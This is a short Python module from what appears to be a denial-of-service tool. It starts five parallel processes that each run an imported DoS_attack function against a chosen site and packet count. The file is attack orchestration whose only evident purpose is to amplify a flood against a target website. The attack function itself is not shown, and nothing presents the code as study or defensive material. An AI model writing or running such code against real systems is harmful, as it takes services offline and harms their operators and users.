from colorama import init
from termcolor import colored
import multiprocessing
from .attack import DoS_attack

def start_processes(site, packets):
    p1 = multiprocessing.Process(target=DoS_attack, args=(site, packets))
    p1.start()

    p2 = multiprocessing.Process(target=DoS_attack, args=(site, packets))
    p2.start()

    p3 = multiprocessing.Process(target=DoS_attack, args=(site, packets))
    p3.start()

    p4 = multiprocessing.Process(target=DoS_attack, args=(site, packets))
    p4.start()

    p5 = multiprocessing.Process(target=DoS_attack, args=(site, packets))
    p5.start()

    p1.join()
    p2.join()
    p3.join()
    p4.join()
    p5.join()